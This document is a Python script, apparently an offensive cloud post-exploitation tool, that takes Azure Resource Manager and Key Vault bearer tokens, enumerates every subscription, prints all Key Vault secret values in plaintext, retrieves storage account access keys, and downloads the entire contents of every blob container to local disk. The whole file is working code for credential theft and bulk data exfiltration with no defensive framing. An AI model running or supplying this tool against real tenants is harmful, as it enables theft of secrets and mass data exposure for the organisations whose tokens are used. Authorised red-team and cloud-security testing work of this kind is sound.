import requests
from azure.storage.blob import BlobServiceClient
import os
import argparse

def parse_arguments():
    parser = argparse.ArgumentParser(description='Azure Storage and Key Vault Downloader')
    parser.add_argument('--arm-token', required=True, help='ARM Bearer Token for Azure Resource Manager')
    parser.add_argument('--vault-token', required=True, help='Vault Bearer Token for Key Vault access')
    parser.add_argument('--download-dir', default='downloads', help='Directory to store downloaded files (default: downloads)')
    return parser.parse_args()

# === HEADERS ===
def setup_headers(arm_token, vault_token):
    return {
        "arm_headers": {
            "Authorization": f"Bearer {arm_token}",
            "Content-Type": "application/json"
        },
        "vault_headers": {
            "Authorization": f"Bearer {vault_token}",
            "Content-Type": "application/json"
        }
    }

# === STEP 1: Enumerate Subscriptions ===
def list_subscriptions():
    print("[*] Listing subscriptions...")
    url = "https://management.azure.com/subscriptions?api-version=2020-01-01"
    r = requests.get(url, headers=arm_headers)
    if r.ok:
        for sub in r.json().get("value", []):
            print(f"Subscription: {sub['displayName']} | ID: {sub['subscriptionId']}")
            yield sub['subscriptionId']
    else:
        print("[!] Failed to list subscriptions:", r.text)

# === STEP 2: Filter for Vaults and StorageAccounts ===
def list_filtered_resources(subscription_id):
    print(f"\n[*] Listing resources in subscription {subscription_id}")
    url = f"https://management.azure.com/subscriptions/{subscription_id}/resources?api-version=2021-04-01"
    r = requests.get(url, headers=arm_headers)
    if not r.ok:
        print(f"[!] Failed to list resources for {subscription_id}:", r.text)
        return

    resources = r.json().get("value", [])
    for res in resources:
        res_type = res.get("type", "").lower()
        name = res.get("name", "Unknown")
        location = res.get("location", "Unknown")

        if res_type == "microsoft.keyvault/vaults":
            print(f"  - {res_type} | Name: {name} | Location: {location}")
            dump_keyvault_secrets(name)

        elif res_type == "microsoft.storage/storageaccounts":
            print(f"  - {res_type} | Name: {name} | Location: {location}")
            resource_id = res.get("id", "")
            resource_group = resource_id.split("/resourceGroups/")[1].split("/")[0]
            key = get_storage_keys(subscription_id, name, resource_group)
            if key:
                enum_blob_storage(name, key)

# === STEP 3: Dump secrets from Key Vaults ===
def dump_keyvault_secrets(vault_name):
    print(f"    🔐 Dumping secrets from Key Vault: {vault_name}")
    url = f"https://{vault_name}.vault.azure.net/secrets?api-version=7.3"
    r = requests.get(url, headers=vault_headers)
    if r.ok:
        secrets = r.json().get("value", [])
        for sec in secrets:
            secret_name = sec["id"].split("/")[-1]
            sec_url = f"https://{vault_name}.vault.azure.net/secrets/{secret_name}?api-version=7.3"
            sec_val = requests.get(sec_url, headers=vault_headers)
            if sec_val.ok:
                secret_value = sec_val.json().get("value", "")
                print(f"      [+] {secret_name} = {secret_value}")
            else:
                print(f"      [!] Failed to get value for {secret_name}")
    else:
        print(f"    [!] Failed to list secrets for {vault_name}")

# === STEP 4: Get storage account keys ===
def get_storage_keys(subscription_id, storage_account_name, resource_group):
    print(f"\n[*] Getting keys for Storage Account: {storage_account_name}")
    url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Storage/storageAccounts/{storage_account_name}/listKeys?api-version=2022-09-01"
    r = requests.post(url, headers=arm_headers)
    if r.ok:
        keys = r.json()["keys"]
        if keys:
            key = keys[0]["value"]
            print(f"  [+] Retrieved storage key for {storage_account_name}")
            return key
    else:
        print(f"  [!] Failed to get keys for {storage_account_name}: {r.text}")
    return None

# === STEP 5: List containers and blobs ===
def enum_blob_storage(storage_account_name, storage_key):
    try:
        blob_url = f"https://{storage_account_name}.blob.core.windows.net"
        service_client = BlobServiceClient(account_url=blob_url, credential=storage_key)
        print(f"  [*] Connecting to Blob Service: {blob_url}")
        containers = service_client.list_containers()
        for container in containers:
            print(f"    📦 Container: {container['name']}")
            container_client = service_client.get_container_client(container['name'])
            blobs = container_client.list_blobs()
            for blob in blobs:
                print(f"      - Blob: {blob.name} | Size: {blob.size} bytes")

        # Add this to trigger download
        download_blobs_from_storage(storage_account_name, storage_key)
    except Exception as e:
        print(f"  [!] Error accessing blob storage: {e}")

# === STEP 6: Download files inside the blobs ===
def download_blobs_from_storage(storage_account_name, storage_key, download_root="downloads"):
    try:
        blob_url = f"https://{storage_account_name}.blob.core.windows.net"
        service_client = BlobServiceClient(account_url=blob_url, credential=storage_key)
        containers = service_client.list_containers()
        
        for container in containers:
            container_name = container["name"]
            print(f"    📁 Downloading from container: {container_name}")
            container_client = service_client.get_container_client(container_name)

            blobs = container_client.list_blobs()
            for blob in blobs:
                blob_name = blob.name
                local_path = os.path.join(download_root, storage_account_name, container_name)
                os.makedirs(local_path, exist_ok=True)

                local_file_path = os.path.join(local_path, os.path.basename(blob_name))
                blob_client = container_client.get_blob_client(blob)

                with open(local_file_path, "wb") as file:
                    stream = blob_client.download_blob()
                    file.write(stream.readall())
                    print(f"        ✅ Downloaded: {blob_name} -> {local_file_path}")
    except Exception as e:
        print(f"    [!] Error downloading blobs: {e}")

# === MAIN EXECUTION ===
if __name__ == "__main__":
    args = parse_arguments()
    headers = setup_headers(args.arm_token, args.vault_token)
    
    # Update global headers
    global arm_headers, vault_headers
    arm_headers = headers["arm_headers"]
    vault_headers = headers["vault_headers"]
    
    print("[*] Starting Azure Storage and Key Vault enumeration...")
    print(f"[*] Download directory set to: {args.download_dir}")
    
    try:
        for sub_id in list_subscriptions():
            list_filtered_resources(sub_id)
        print("\n[*] Enumeration completed successfully!")
    except Exception as e:
        print(f"\n[!] An error occurred during execution: {str(e)}")